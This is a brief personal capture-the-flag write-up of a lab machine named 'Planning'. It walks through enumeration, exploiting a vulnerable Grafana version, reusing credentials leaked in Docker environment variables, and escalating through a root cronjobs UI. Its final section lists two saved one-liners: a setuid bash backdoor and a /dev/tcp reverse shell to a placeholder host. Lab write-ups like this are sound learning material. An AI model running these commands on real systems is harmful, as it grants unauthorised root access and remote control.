# Planning Machine - Notes

## Enumeration
1. **Nmap Scan**:
   - Found two open ports: **80 (HTTP)** and **22 (SSH)**.

2. **Vhost Enumeration**:
   - Discovered a server hosting **Grafana**. i didn't know what it was (nor did i have the curiosity to discover it)
   - Initially, I didn't know what Grafana was and didn't investigate further (a mistake in hindsight).
   - Used `whatweb` to identify the version of Grafana.

3. **Vulnerability Discovery**:
   - Found a vulnerable version of Grafana related to **CVE-2024-9264**.
   - Executed the exploit payload and discovered the application was hosted in a Docker container.

## Exploitation
1. **Environment Variables**:
   - Found credentials in the environment variables within the Docker container.
   - Used the credentials to connect via SSH as a user.

## Privilege Escalation
1. **LinPEAS Scan**:
   - Ran `linpeas` and discovered a database located in `/opt/crontabs`.
   - Found port **8000** active when checking open ports, this time got the curiosity to look it up `=)`

2. **SSH Port Forwarding**:
   - Used SSH port forwarding to investigate port **8000**.
   - Discovered a **Cronjobs UI** running as root.

3. **Root Flag**:
   - Couldn't obtain a reverse shell (unsure why), but successfully retrieved the root flag.

## Additional Notes
- Found an interesting payload for privilege escalation in future CTF challenges:
  ```bash
  cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
  #another one
  /bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1' 
  ```